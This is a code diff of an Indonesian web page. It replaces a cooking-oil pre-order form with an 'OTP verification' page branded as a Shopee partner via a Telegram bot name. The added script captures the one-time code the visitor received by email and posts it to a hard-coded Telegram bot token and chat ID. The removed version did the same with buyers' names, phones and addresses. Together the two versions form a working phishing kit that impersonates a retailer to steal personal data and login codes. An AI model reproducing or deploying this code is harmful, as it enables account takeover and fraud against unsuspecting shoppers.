@@ -2,145 +2,75 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <metaviewport" content="width=device-width, initial-scale=1.0">
-    <title>Pre-Order Minyak Goreng</title>
-    <link rel="stylesheet" href="style.css">
-    <!-- Font Awesome untuk ikon -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>Verifikasi Kode OTP</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 2em; background: #f4f4f4;}
+        .otp-form { max-width: 350px; margin: 2em auto; background: #fff; border-radius: 8px; box-shadow: 0 2px 8px #0001; padding: 32px 24px; }
+        .telegram-contact { margin-top: 2em; text-align: center; }
+        .telegram-btn {
+            background: #229ED9;
+            color: #fff;
+            padding: 10px 22px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            display: inline-block;
+            margin-top: 8px;
+        }
+        .telegram-btn:hover { background: #177CA6; }
+        label, input { display: block; width: 100%; margin-bottom: 12px;}
+        button { width: 100%; padding: 10px 0; background: #27c28c; color: #fff; border: none; border-radius: 5px; font-size: 1.1em; font-weight: bold; }
+        button:hover { background: #1e9a70; }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <div class="logo-wrapper">
-                <div class="logo">
-                    <!-- Ikon tetesan minyak -->
-                    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12 2C7.58172 2 4 5.58172 4 10C4 13.0645 5.58332 15.6888 8 18V21C8 21.5523 8.44772 22 9 22H15C15.5523 22 16 21.5523 16 21V18C18.4167 15.6888 20 13.0645 20 10C20 5.58172 16.4183 2 12 2Z" fill="#FFD600"/>
-                    </svg>
-                </div>
-            </div>
-            <h1>Pre-Order Minyak Goreng</h1>
-            <p>Pesan minyak goreng berkualitas dengan harga terbaik untuk kebutuhan bisnis Anda</p>
-        </header>
-        <main class="order-form-section">
-            <div class="form-card">
-                <h2>
-                    <i class="fas fa-box-open icon-cube"></i>
-                    Informasi Pemesan
-                </h2>
-                <form id="orderForm">
-                    <div class="form-group">
-                        <label for="namaLengkap">Nama Lengkap *</label>
-                        <input type="text" id="namaLengkap" placeholder="Masukkan nama lengkap" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="nomorTelepon">Nomor Telepon *</label>
-                        <input type="tel" id="nomorTelepon" placeholder="08xxxxxxxxxx" required pattern="[0-9]{10,13}">
-                    </div>
-                    <div class="form-group">
-                        <label for="alamatLengkap">Alamat Lengkap *</label>
-                        <textarea id="alamatLengkap" placeholder="Masukkan alamat lengkap untuk pengiriman" rows="4" required></textarea>
-                    </div>
-                    <h2>
-                        <i class="fas fa-shopping-cart icon-cart"></i>
-                        Pilihan Produk
-                    </h2>
-                    <div class="product-section">
-                        <div class="form-group product-group">
-                            <label class="checkbox-label">
-                                <input type="checkbox" id="produk1" value="Mikita wilmar Refill 1l">
-                                <span class="checkmark"></span>
-                                Mikita wilmar Refill 1l
-                            </label>
-                            <div class="quantity-input">
-                                <label for="jumlah1">Jumlah:</label>
-                                <input type="number" id="jumlah1" min="0" value="0" placeholder="0">
-                            </div>
-                        </div>
-                        <div class="form-group product-group">
-                            <label class="checkbox-label">
-                                <input type="checkbox" id="produk2" value="Mikita botol sinar gemilang 1l">
-                                <span class="checkmark"></span>
-                                Mikita botol sinar gemilang 1l
-                            </label>
-                            <div class="quantity-input">
-                                <label for="jumlah2">Jumlah:</label>
-                                <input type="number" id="jumlah2" min="0" value="0" placeholder="0">
-                            </div>
-                        </div>
-                        <div class="form-group product-group">
-                            <label class="checkbox-label">
-                                <input type="checkbox" id="produk3" value="Mikita pouch Sinarmas 1l">
-                                <span class="checkmark"></span>
-                                Mikita pouch Sinarmas 1l
-                            </label>
-                            <div class="quantity-input">
-                                <label for="jumlah3">Jumlah:</label>
-                                <input type="number" id="jumlah3" min="0" value="0" placeholder="0">
-                            </div>
-                        </div>
-                    </div>
-                    <button type="submit" id="verifikasiButton">Verifikasi Terima Pengiriman</button>
-                </form>
-            </div>
-        </main>
+    <div class="otp-form">
+        <h2>Masukkan Kode OTP</h2>
+        <form id="otpForm">
+            <label for="otp">Kode OTP (dikirim ke email Anda):</label>
+            <input type="text" id="otp" maxlength="6" required placeholder="Masukkan kode OTP">
+            <button type="submit">Verifikasi</button>
+        </form>
     </div>
-
-    <!-- Script kirim ke Telegram -->
+    <div class="telegram-contact">
+        <p>Butuh bantuan? Hubungi bot Telegram kami:</p>
+        <a class="telegram-btn" href="https://t.me/Shopee_MitraMinyakGorengBot" target="_blank">
+            @Shopee_MitraMinyakGorengBot
+        </a>
+        <p style="font-size:0.9em;color:#888">Chat ID: 5923031825</p>
+    </div>
     <script>
-    document.addEventListener('DOMContentLoaded', function () {
-        document.getElementById('orderForm').addEventListener('submit', function (event) {
-            event.preventDefault();
-
-            // Ambil data input
-            var nama = document.getElementById('namaLengkap').value.trim();
-            var telepon = document.getElementById('nomorTelepon').value.trim();
-            var alamat = document.getElementById('alamatLengkap').value.trim();
-
-            // Produk
-            var produkList = [];
-            for (let i = 1; i <= 3; i++) {
-                let checkbox = document.getElementById('produk' + i);
-                let jumlah = document.getElementById('jumlah' + i).value;
-                if (checkbox.checked && parseInt(jumlah) > 0) {
-                    produkList.push(checkbox.value + " (" + jumlah + ")");
-                }
+    document.getElementById('otpForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        var otp = document.getElementById('otp').value.trim();
+        if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
+            alert("Kode OTP harus 6 digit angka");
+            return;
+        }
+        var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
+        var chat_id = "5923031825";
+        var text = "Verifikasi OTP: " + otp;
+        var url = "https://api.telegram.org/bot" + token + "/sendMessage";
+        var params = {
+            chat_id: chat_id,
+            text: text
+        };
+        fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(params)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                alert('OTP berhasil diverifikasi!');
+                window.location.href = 'index.html'; // arahkan sesuai kebutuhan
+            } else {
+                alert('Gagal mengirim ke Telegram: ' + data.description);
             }
-            var produkText = produkList.length ? produkList.join(", ") : "Tidak ada";
-
-            // Kirim ke Telegram
-            var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
-            var chat_id = "5923031825";
-            var text =
-                "Formulir Pesanan Minyak Goreng:\n"
-                + "Nama: " + nama + "\n"
-                + "Telepon: " + telepon + "\n"
-                + "Alamat: " + alamat + "\n"
-                + "Produk: " + produkText;
-
-            var url = "https://api.telegram.org/bot" + token + "/sendMessage";
-            var params = {
-                chat_id: chat_id,
-                text: text
-            };
-
-            fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(params)
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert('Selamat! Verifikasi mu berhasil, silahkan ditunggu kedatangan barang anda.');
-                    window.location.href = 'index.html';
-                } else {
-                    alert('Gagal mengirim ke Telegram: ' + data.description);
-                }
-            })
-            .catch((error) => {
-                alert("Gagal koneksi ke Telegram: " + error);
-            });
+        })
+        .catch((error) => {
+            alert("Gagal koneksi ke Telegram: " + error);
         });
     });
     </script>
